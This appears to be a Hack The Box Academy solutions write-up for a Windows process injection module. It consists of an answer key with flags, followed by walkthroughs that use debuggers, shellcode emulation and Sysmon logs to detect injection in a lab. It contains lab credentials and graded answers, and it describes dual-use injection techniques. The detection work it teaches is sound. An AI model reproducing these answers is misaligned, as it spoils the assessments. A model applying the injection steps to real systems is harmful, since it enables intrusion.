| Section                                  | Question Number | Answer                                                       |
| ---------------------------------------- | --------------- | ------------------------------------------------------------ |
| Internals and Key Structures             | Question 1      | hostname.exe                                                 |
| Compiling Shellcode and DLL              | Question 1      | DONE                                                         |
| Self Injection (Local Process Injection) | Question 1      | USER32.DLL                                                   |
| Detecting Self Injection                 | Question 1      | DONE                                                         |
| Remote Dynamic-link Library Injection    | Question 1      | CTF{1nj3ct10n\_1s\_n0t\_ju5t\_f0r\_m3dicin3}                 |
| Detecting DLL Injection                  | Question 1      | windbgr.dll                                                  |
| Detecting DLL Injection                  | Question 2      | remote.log                                                   |
| TEH - Implementation and Debugging       | Question 1      | notepad.exe                                                  |
| TEH - Implementation and Debugging       | Question 2      | Administrators                                               |
| TEH - Implementation and Debugging       | Question 3      | pass@ABC!@#4                                                 |
| TEH - Detection Opportunities            | Question 1      | 0x1000                                                       |
| Early Bird APC Queue Injection           | Question 1      | win32calc.exe                                                |
| APC - Detection Opportunities            | Question 1      | 0                                                            |
| Debugging TLS Callback                   | Question 1      | HackTheBox                                                   |
| Section View Mapping - Implementation    | Question 1      | wowreg32.exe                                                 |
| Detection Opportunities                  | Question 1      | 185.220.101.70                                               |
| PE Injection - Implementation            | Question 1      | C:\\AtomicRedTeam\\atomics\\T1055.002\\bin\\RedInjection.exe |
| PE Injection - Detection Opportunities   | Question 1      | DONE                                                         |
| Demo and Detections                      | Question 1      | CreateProcessWithPipe.exe                                    |
| RDLL Injection - Implementation          | Question 1      | 00001048                                                     |
| RDLL Injection - Implementation          | Question 2      | 0xEC0E4E8E                                                   |
| Reflective DLL Injection - Detections    | Question 1      | 69632                                                        |
| Process Injection - Skills Assessment    | Question 1      | 2                                                            |
| Process Injection - Skills Assessment    | Question 2      | avastxo.com                                                  |
| Process Injection - Skills Assessment    | Question 3      | airbusocean.com                                              |
| Process Injection - Skills Assessment    | Question 4      | hh.exe                                                       |
| Process Injection - Skills Assessment    | Question 5      | FLAG{APC\_Qu3u3D\_but\_f0r\_wh0?}                            |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Internals and Key Structures

## Question 1

### "Debug hostname.exe in WinDbg. What is the name of the module loaded at the address mentioned in the "ImageBaseAddress"?"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.181]─[htb-ac-8414@htb-qlrqwmkhac]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.26 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[05:21:34:186] [16807:16834] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:21:34:187] [16807:16834] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:21:34:187] [16807:16834] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:21:34:234] [16807:16834] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:21:34:234] [16807:16834] [WARN][com.freerdp.crypto] - CN = Logging-VM
[05:21:34:234] [16807:16834] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:21:34:235] [16807:16834] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:21:34:235] [16807:16834] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:21:34:235] [16807:16834] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.26:3389) 
[05:21:34:235] [16807:16834] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:21:34:235] [16807:16834] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:21:34:235] [16807:16834] [ERROR][com.freerdp.crypto] - 	Logging-VM
[05:21:34:235] [16807:16834] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.26:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `WinDbg` by double-clicking on the shortcut on the desktop. Subsequently, students will navigate to `File` located in the top left corner, and then students will select `Recent` and from the list will select the `hostname.exe` executable:

![[HTB Solutions/Others/z. images/31d4720f8ccb76c129fb77ff2cbd8091_MD5.jpg]]

Students will display the information about the process environment block in the current process using the `!peb` command in the `Command` window to find the address of `ImageBaseAddress` and the module loaded:

Code: cmd

```cmd
!peb
```

![[HTB Solutions/Others/z. images/9236439bda25f324bdedf6d11e032140_MD5.jpg]]

Answer: `HOSTNAME.EXE`

# Self Injection (Local Process Injection)

## Question 1

### "Perform the shellcode injection in the local process as instructed in this section. Save the shellcode using x64dbg. Analyze the shellcode in speakeasy. What is the name of the DLL mentioned in the output? Answer formal is \*\*\*\*\*\*.DLL"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.181]─[htb-ac-8414@htb-qlrqwmkhac]─[~]
└──╼ [★]$ xfreerdp /v:10.129.199.196 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[05:46:07:216] [55272:55273] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:46:07:216] [55272:55273] [WARN][com.freerdp.crypto] - CN = Logging-VM
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.199.196:3389) 
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - 	Logging-VM
[05:46:07:217] [55272:55273] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.199.196:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `x64dbg.exe` located on the desktop. Subsequently, students will open the `local_shellcode_inj.exe` executable located in `C:\injection\local` within `x64dbg` by click on `File` > `Open`:

![[HTB Solutions/Others/z. images/fe6c1c9609ac9da2a0fc3f16b2e43f51_MD5.jpg]]

![[HTB Solutions/Others/z. images/3369bfd99a4894ce3c30ae93f48e54b5_MD5.jpg]]

Next, students will navigate to the `Symbols` tab, select the `kernel32.dll` module, and place breakpoints by right-clicking on the `VirtualAlloc` and `CreateThread` functions:

![[HTB Solutions/Others/z. images/1d87e97d937ad5922a0be10dfac104f8_MD5.jpg]]

![[HTB Solutions/Others/z. images/d72a44027d887842c07ec9a80b990e4a_MD5.jpg]]

Students will return to the `CPU` tab and will run the program until the first breakpoint is reached (`VirtualAlloc`):

![[HTB Solutions/Others/z. images/af976f8f9e0ccad19cd021a631e5a1a0_MD5.jpg]]

Once reached, students will click `Run` once and will open the window of the `local_shellcode_inj.exe` process to copy the address of the allocated memory:

![[HTB Solutions/Others/z. images/14cdc98b2d80e57ef9c14d696a864e5d_MD5.jpg]]

Students will return to the debugger and, within the `Dump 1` tab at the bottom, will right-click and select `Go to` > `Expression` and paste the previously copied memory address:

![[HTB Solutions/Others/z. images/b1c1a2279a3347e1a8060981c8ca9c71_MD5.jpg]]

![[HTB Solutions/Others/z. images/f0798081a5950bd7fdb8bed2f9122062_MD5.jpg]]

Next, students will click on `Run` once until the `CreateThread` breakpoint is reached. Subsequently, students will notice the memory address space is populated with the shellcode. They will select the shellcode from the starting byte (`48`) to the end byte (`C3`), and right-click `Binary` > `Save To a File`:

![[HTB Solutions/Others/z. images/68cd01742dbaee6289ed7dd249014189_MD5.jpg]]

Students will save the extracted shellcode in `C:\Temp`:

![[HTB Solutions/Others/z. images/3a7b36e8e84b600fb994f88f84618323_MD5.jpg]]

Students will open Command Prompt and use `speakeasy` to perform analysis of the shellcode using the `-t` option to specify the target, the `-r` option to specify a shellcode, and the `-a` option to specify the architecture (`x64`) and find the DLL within the `LoadLibraryA` function:

Code: cmd

```cmd
speakeasy -t "C:\Temp\shellcode.bin" -r -a x64
```

```
C:\Users\Administrator>speakeasy -t "C:\Temp\shellcode.bin" -r -a x64

* exec: shellcode
0x1027: 'kernel32.LoadLibraryA("{hidden}")' -> 0x77d10000
0x1050: 'user32.MessageBoxA(0x0, "Hello world", "Message", 0x0)' -> 0x2
0x1068: 'kernel32.ExitProcessW(0x0)' -> 0x0
* Finished emulating
```

Answer: `USER32.DLL`

# Remote Dynamic-link Library Injection

## Question 1

### "Run the C:\\injection\\exercises\\debug.bat file to simulate a process injection technique. Investigate the Sysmon logs to get the flag. Answer format is CTF{XXX....}"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.181]─[htb-ac-8414@htb-ljbbjfeeci]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.26 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[00:21:13:832] [88573:88574] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[00:21:13:832] [88573:88574] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[00:21:13:832] [88573:88574] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[00:21:13:884] [88573:88574] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:21:13:884] [88573:88574] [WARN][com.freerdp.crypto] - CN = Logging-VM
[00:21:13:884] [88573:88574] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:13:885] [88573:88574] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:21:13:885] [88573:88574] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:13:885] [88573:88574] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.26:3389) 
[00:21:13:885] [88573:88574] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:21:13:885] [88573:88574] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:21:13:885] [88573:88574] [ERROR][com.freerdp.crypto] - 	Logging-VM
[00:21:13:885] [88573:88574] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.26:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt and display the contents of the `debug.bat` file to find the `remote-debug.exe` executable is being started and take a note of it:

Code: cmd

```cmd
type C:\injection\exercises\debug.bat
```

```
C:\Users\Administrator>type C:\injection\exercises\debug.bat

@echo off
start "" "C:\injection\remote\exercises\remote-debug.exe"
```

Next, students will run the `debug.bat` file to simulate a process injection technique:

Code: cmd

```cmd
C:\injection\exercises\debug.bat
```

```
C:\Users\Administrator>C:\injection\exercises\debug.bat
```

Right after initiating the process injection technique, students will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. Subsequently, they will utilize the `Filter Current Log` feature to filter for events related to `Sysmon Event ID 1` (`Process Creation`). For brevity, students can clear the log and execute the `.bat` file:

![[HTB Solutions/Others/z. images/7515c6d4a8da19b4cd3e5174189329d6_MD5.jpg]]

Scrutinizing the logs, students will stumble upon the log related to process creation (start of the process) of the `remote-debug.exe` executable file. Within the information about the log, they will note down the `ProcessId` value (`3500`):

![[HTB Solutions/Others/z. images/95626e7480f3817f09af9171fd7cb2d8_MD5.jpg]]

Next, students will modify the previously applied filter to `Sysmon Event Id 8` (`CreateRemoteThread`) to search for events where a process creates a thread in another process, resembling the process injection technique:

![[HTB Solutions/Others/z. images/c23b6e45edec4b148e3b3e24bd1af151_MD5.jpg]]

Investigating the log, students will uncover the new process id of the spawned process in the `TargetProcessId` from the `remote-debug.exe` process (`3500`) and take note of the value (`2176`):

![[HTB Solutions/Others/z. images/aba8998c563f40f9cfa9d971c0329074_MD5.jpg]]

Next, students will change the filter to look for `Sysmon Event Id 11` (`FileCreate`) events related to file create operations:

![[HTB Solutions/Others/z. images/99dfd86290d405b04d9c9f29c3c8e888_MD5.jpg]]

They will utilize the `Find` feature to look for logs related to the `2176` process id:

![[HTB Solutions/Others/z. images/c4f7b5caa09f13e2774ff93bfada27f3_MD5.jpg]]

Students will find the `backgroundtaskhost.exe` process (`2176`) has created a file `win-debug.txt`:

![[HTB Solutions/Others/z. images/12e72fa289f80f5cbc29b69a87b38ee3_MD5.jpg]]

Students will copy the path to the target file (`win-debug.txt`) and will return to the Command Prompt terminal to query the contents of the file and obtain the flag:

Code: cmd

```cmd
type C:\Users\ADMINI~1\AppData\Local\Temp\2\win-debug.txt
```

```
C:\Users\Administrator>type C:\Users\ADMINI~1\AppData\Local\Temp\2\win-debug.txt

{hidden}
```

Answer: `CTF{1nj3ct10n_1s_n0t_ju5t_f0r_m3dicin3}`

# Detecting DLL Injection

## Question 1

### "Run the file "C:\\injection\\exercises\\remote.bat" and investigate the event logs. What is the name of the DLL that is injected?"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.181]─[htb-ac-8414@htb-xdie2knxwa]─[~]
└──╼ [★]$ xfreerdp /v:10.129.214.38 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[03:09:06:241] [7055:7056] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:09:06:241] [7055:7056] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:09:06:241] [7055:7056] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:09:06:288] [7055:7056] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:09:06:288] [7055:7056] [WARN][com.freerdp.crypto] - CN = Logging-VM
[03:09:06:289] [7055:7056] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:09:06:290] [7055:7056] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:09:06:290] [7055:7056] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:09:06:290] [7055:7056] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.214.38:3389) 
[03:09:06:290] [7055:7056] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:09:06:290] [7055:7056] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:09:06:290] [7055:7056] [ERROR][com.freerdp.crypto] - 	Logging-VM
[03:09:06:290] [7055:7056] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.214.38:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and execute the `remote.bat` file located in the `C:\injection\exercises\` directory:

Code: powershell

```powershell
C:\injection\exercises\remote.bat
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> C:\injection\exercises\remote.bat
```

Next, students will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. Students will use the `Find` feature to search for the `remote.bat` string, where they will find the spawned process (`remote.exe`) and take note of the process id (`1604`):

![[HTB Solutions/Others/z. images/237e3dfd3ecf589e74cac548aa066dd2_MD5.jpg]]

![[HTB Solutions/Others/z. images/248e00f7f68850334185e186312ae7e5_MD5.jpg]]

Subsequently, students will change the filter to look for `Sysmon Event ID 8` (`CreateRemoteThread`) logs for indication of thread creation in another process, where they will find the process id (`5876`) in the `TargetProcessId` parameter and take note of it:

![[HTB Solutions/Others/z. images/75f69f534cd3893ede9f3f54b6e00a30_MD5.jpg]]

![[HTB Solutions/Others/z. images/ef6a0aa002af227276ad7361cc2d1fca_MD5.jpg]]

Students will modify the filter to look for `Sysmon Event Id 7` (`Image loaded`) related to module load events such as DLLs and use the `Find` feature to look for logs related to the process id value found previously to find a log and scrutinize the `ImageLoaded` parameter to find a DLL loaded from not a typical location such as `C:\Windows\System32`:

![[HTB Solutions/Others/z. images/07c529dad86ef4caa8fa532766710d65_MD5.jpg]]

![[HTB Solutions/Others/z. images/13f1247f0bdd10849e792bdb51e679bc_MD5.jpg]]

Answer: `windbgr.dll`

# Detecting DLL Injection

## Question 2

### "What is the name of the file that is created in the temporary path?"

Students will change the filter to look for `Sysmon Event ID 11` (`File Create`) event logs and will use the `Find` feature to search using the process id found earlier (`5876`):

![[HTB Solutions/Others/z. images/7cd020b6d3df56725ca1ee95449bb289_MD5.jpg]]

![[HTB Solutions/Others/z. images/dcf6542e8e17b370b153e0b3fb9e2756_MD5.jpg]]

Upon investigating the logs, students will find the name of the file created in a temporary directory in the `TargetFilename` parameter using the `svchost.exe` process:

![[HTB Solutions/Others/z. images/00a9c133b3176107fc3a1ac789284649_MD5.jpg]]

Answer: `remote.log`

# TEH - Implementation and Debugging

## Question 1

### "Run the file "C:\\injection\\exercises\\suspended\_inject.bat" to perform a thread execution hijacking attack. It runs shellcode in a thread of a remote process. What is the name of the remote process in which the attack is performed?"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.181]─[htb-ac-8414@htb-3luprrx34b]─[~]
└──╼ [★]$ xfreerdp /v:10.129.163.216 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[05:52:57:142] [60313:60314] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:52:57:142] [60313:60314] [WARN][com.freerdp.crypto] - CN = Logging-VM
[05:52:57:142] [60313:60314] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:52:57:142] [60313:60314] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:52:57:142] [60313:60314] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:52:57:142] [60313:60314] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.163.216:3389) 
[05:52:57:142] [60313:60314] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:52:57:143] [60313:60314] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:52:57:143] [60313:60314] [ERROR][com.freerdp.crypto] - 	Logging-VM
[05:52:57:143] [60313:60314] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.163.216:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and run `suspended_inject.bat` located in the `C:\injection\exercises\` directory:

Code: powershell

```powershell
C:\injection\exercises\suspended_inject.bat
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> C:\injection\exercises\suspended_inject.bat
```

Next, students will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. Students will use the `Find` feature to search for the `suspended_inject.bat` string, where they will find the spawned process (`teh.exe`) and find the name of the remote process while taking note of the process id (`3908`):

![[HTB Solutions/Others/z. images/a1028ac5852b8efa3833a2baa8412d03_MD5.jpg]]

![[HTB Solutions/Others/z. images/a73ebae386fabd8dbe2b02a0f3eac3ce_MD5.jpg]]

Answer: `notepad.exe`

# TEH - Implementation and Debugging

## Question 2

### "Which local group is modified? Answer format is \*\*\*\*\*\*\*\*\*\*\*\*\*s"

Students will filter out for `Sysmon Event ID 10` (`Process Access`) using the `Filter Current Log...` feature and use the `Find` feature to look for the id of the process found earlier (`3908`):

![[HTB Solutions/Others/z. images/f68dd1ed3ce1a3634ec3869631123452_MD5.jpg]]

![[HTB Solutions/Others/z. images/ec121ef9825b775ba1e2f6c745867727_MD5.jpg]]

Students will go through the logs to find the log related to process injection to the `notepad.exe` process and note the process id (`2936`) within the `TargetProcessId` parameter:

![[HTB Solutions/Others/z. images/6dc10350eb648ee894da3b2eebd3b692_MD5.jpg]]

Next, students will modify the filter to look for `Sysmon Event ID 1` (`Process Create`) logs using the process id of the notepad process:

![[HTB Solutions/Others/z. images/25f7a49e9a735d6816b428cf36fc0684_MD5.jpg]]

![[HTB Solutions/Others/z. images/da0e7ff0b18fc19a4bfbdc4e83460447_MD5.jpg]]

Students will stumble upon an event showcasing how `notepad.exe` (the parent process) spawned `cmd.exe` and executed a command related to account creation and group modification within the `CommandLine` parameter:

![[HTB Solutions/Others/z. images/505c2d3ad178f2b3aa7af5c5528d0257_MD5.jpg]]

Answer: `Administrators`

# TEH - Implementation and Debugging

## Question 3

### "What is the password assigned to the newly created user?"

Students will find the password of the newly created user in the previously found event:

![[HTB Solutions/Others/z. images/505c2d3ad178f2b3aa7af5c5528d0257_MD5.jpg]]

Answer: `pass@ABC!@#4`

# TEH - Detection Opportunities

## Question 1

### "Run the file "C:\\injection\\exercises\\suspended\_inject.bat" and check the Sealighter-TI events for "task\_name": "KERNEL\_THREATINT\_TASK\_SETTHREADCONTEXT". What is the value of PcVadCommitSize?"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-58b2blwtst]─[~]
└──╼ [★]$ xfreerdp /v:10.129.195.99 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution 

[01:56:40:267] [35722:35747] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:56:40:267] [35722:35747] [WARN][com.freerdp.crypto] - CN = Logging-VM
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.195.99:3389) 
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - 	Logging-VM
[01:56:40:267] [35722:35747] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.195.99:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and run `suspended_inject.bat` located in the `C:\injection\exercises\` directory:

Code: powershell

```powershell
C:\injection\exercises\suspended_inject.bat
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> C:\injection\exercises\suspended_inject.bat
```

Next, students will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. Students will use the `Find` feature to search for the `suspended_inject.bat` string, where they will find the spawned process (`teh.exe`) and find the name of the remote process while taking note of the process id (`5964`):

![[HTB Solutions/Others/z. images/f58b6b89fcaab672286eab924109a0dc_MD5.jpg]]

![[HTB Solutions/Others/z. images/9def1fbbb3547e892aac689d30cbe1c0_MD5.jpg]]

Students will navigate to `Application and Services Logs` > `Sealighter` > `Operational` and are going to use the `Find` feature to look for an event related to the `5964` process id and the task name `KERNEL_THREATINT_TASK_SETTHREADCONTEXT`, where they will find the value of `PcVadCommitSize`:

![[HTB Solutions/Others/z. images/b1aad6d59fcdd40579cdfd4647880965_MD5.jpg]]

![[HTB Solutions/Others/z. images/f0efdb86b6258699ee158aa8eec665ac_MD5.jpg]]

Answer: `0x1000`

# Early Bird APC Queue Injection

## Question 1

### "Simulate the APC injection related Atomic test number T1055.004-3 in PowerShell. Check the event logs after the simulation. Type the name of the GUI child process as your answer. Answer format is ***32***\*.exe"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-gat2h1clfv]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.26 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution 

[03:04:55:866] [5028:5029] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:04:55:866] [5028:5029] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:04:55:866] [5028:5029] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:04:55:909] [5028:5029] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:04:55:909] [5028:5029] [WARN][com.freerdp.crypto] - CN = Logging-VM
